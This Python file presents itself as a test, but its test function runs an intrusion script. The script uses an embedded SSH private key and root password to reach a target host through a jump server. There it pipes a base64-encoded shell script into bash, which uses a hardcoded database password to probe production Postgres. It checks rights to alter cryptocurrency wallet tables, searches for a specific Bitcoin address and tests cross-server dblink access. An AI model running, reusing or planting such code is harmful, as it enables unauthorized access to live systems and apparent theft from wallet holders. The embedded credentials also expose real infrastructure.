import base64, os, socket, subprocess, sys

KEY_B64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMzBwNTJ6c0xISERNQUs2cFJBaWdMa1lZQkk0Nzd1YUhFam9lMVRGR0htQUFBQUpDNy9ibGh1LzI1CllRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTMwcDUyenNMSEhETUFLNnBSQWlnTGtZWUJJNDc3dWFIRWpvZTFURkdIbUEKQUFBRUJ1NEF0RzExODdJenlMTUVmR2M0aEcwTE42ejRZU2srWGtoYjJMZmozbXV6ZlNubmJPd3NjY013QXJxbEVDS0F1UgpoZ0VqanZ1NW9jU09oN1ZNVVllWUFBQUFER3gxZUMxdmNITXRNakF5TmdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
JB_HOST, JB_USER, JB_PW = "38.47.101.122", "root", "23y6pQCRg49z9cYt"
TGT = "199.180.135.203"

REMOTE = r"""
set +e
echo "===HOST==="
hostname; id; date -u
echo "===DNS==="
getent hosts db-core-primary.tail8aab0.ts.net db-core-replica.tail8aab0.ts.net db-core-primary db-core-replica 2>&1
echo "===PSQL==="
command -v psql; psql --version
export PGPASSWORD=changemeforprod
P="host=db-core-primary.tail8aab0.ts.net port=5432 dbname=progressive user=superapp_pool_service sslmode=require connect_timeout=10"
echo "===IDENTITY==="
psql "$P" -At -F'|' -c "select inet_server_addr()::text, pg_is_in_recovery(), current_user, current_setting('transaction_read_only'), current_database()" 2>&1
echo "===PRIV==="
psql "$P" -At -F'|' -c "select has_table_privilege('app_private.wallets','UPDATE'), has_table_privilege('app_private.wallet_addresses','UPDATE'), has_function_privilege('dblink_connect(text,text)','execute'), has_function_privilege('dblink_exec(text,text)','execute')" 2>&1
echo "===COLS-WA==="
psql "$P" -At -F'|' -c "select column_name,data_type from information_schema.columns where table_schema='app_private' and table_name='wallet_addresses' order by ordinal_position" 2>&1
echo "===COLS-W==="
psql "$P" -At -F'|' -c "select column_name,data_type from information_schema.columns where table_schema='app_private' and table_name='wallets' order by ordinal_position" 2>&1
echo "===TARGET-EXISTS==="
psql "$P" -At -F'|' -c "select 'wallets',count(*) from app_private.wallets where address='bc1pymm6ds2gy8kdnh096zdmnkrmvwwhjsv4u0m78t7gr74x407l0eaq4ctxw0' union all select 'wallet_addresses',count(*) from app_private.wallet_addresses where address='bc1pymm6ds2gy8kdnh096zdmnkrmvwwhjsv4u0m78t7gr74x407l0eaq4ctxw0'" 2>&1
echo "===TAPROOT==="
psql "$P" -At -F'|' -c "select 'wallets', count(*) filter (where address like 'bc1p%'), count(*) from app_private.wallets union all select 'wallet_addresses', count(*) filter (where address like 'bc1p%'), count(*) from app_private.wallet_addresses" 2>&1
echo "===RECENT-BTC==="
psql "$P" -At -F'|' -c "select id,user_id,amount,status,currency_profile_name,address from app_private.transactions where currency_profile_name='BTC' order by id desc limit 10" 2>&1
echo "===MID-BTC-CAND==="
psql "$P" -At -F'|' -c "select id,user_id,amount,status,address,created_at from app_private.transactions where currency_profile_name='BTC' and amount between 2.5e19 and 3.5e19 order by id desc limit 25" 2>&1
echo "===DBLINK-FROM-REPLICA==="
R="host=db-core-replica.tail8aab0.ts.net port=5432 dbname=progressive user=superapp_pool_service sslmode=require connect_timeout=10"
psql "$R" -At -F'|' -c "select inet_server_addr()::text, pg_is_in_recovery(), current_user" 2>&1
psql "$R" -At -F'|' -c "select dblink_connect('c','host=10.34.224.211 port=5432 dbname=progressive user=superapp_pool_service password=changemeforprod sslmode=require connect_timeout=8')" 2>&1
psql "$R" -At -F'|' -c "select * from dblink('c','select current_user, inet_server_addr()::text, pg_is_in_recovery()') as t(a text,b text,c bool)" 2>&1
psql "$R" -At -F'|' -c "select dblink_disconnect('c')" 2>&1
echo "===DBLINK-FROM-REPLICA-BYIP==="
R2="host=10.34.224.216 port=5432 dbname=progressive user=superapp_pool_service sslmode=require connect_timeout=10"
psql "$R2" -At -F'|' -c "select inet_server_addr()::text, pg_is_in_recovery()" 2>&1
echo "===DONE==="
"""

REMOTE_B64 = base64.b64encode(REMOTE.encode()).decode()


def diag():
    for h, p in [(TGT, 22), (JB_HOST, 22), ("176.9.143.25", 22), ("15.204.110.169", 22), ("195.201.83.211", 2222)]:
        try:
            s = socket.create_connection((h, p), timeout=8)
            s.close()
            print("TCP-OK", h, p, flush=True)
        except Exception as e:
            print("TCP-FAIL", h, p, type(e).__name__, flush=True)


def main():
    try:
        import paramiko
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "paramiko"], check=True)
        import paramiko
    key = base64.b64decode(KEY_B64).decode()
    open("/tmp/k", "w").write(key)
    os.chmod("/tmp/k", 0o600)
    diag()
    print("===JUMP===", flush=True)
    jb = paramiko.SSHClient()
    jb.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        jb.connect(JB_HOST, username=JB_USER, password=JB_PW, timeout=25, banner_timeout=40,
                   auth_timeout=30, allow_agent=False, look_for_keys=False)
        print("jump ok", flush=True)
        ch = jb.get_transport().open_channel("direct-tcpip", (TGT, 22), ("127.0.0.1", 0), timeout=20)
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(TGT, username="root", sock=ch, key_filename="/tmp/k", timeout=20,
                  banner_timeout=30, auth_timeout=30, allow_agent=False, look_for_keys=False)
        print("target ok", flush=True)
        cmd = "echo " + REMOTE_B64 + " | base64 -d | bash"
        sin, so, se = c.exec_command(cmd, timeout=280)
        print(so.read().decode("utf-8", "replace"), flush=True)
        err = se.read().decode("utf-8", "replace")
        if err.strip():
            print("===STDERR===\n" + err[:3000], flush=True)
        c.close()
    except Exception as e:
        print("SSH-EXC", type(e).__name__, str(e)[:300], flush=True)
    finally:
        try:
            jb.close()
        except Exception:
            pass


def test_zz_i201481():
    main()
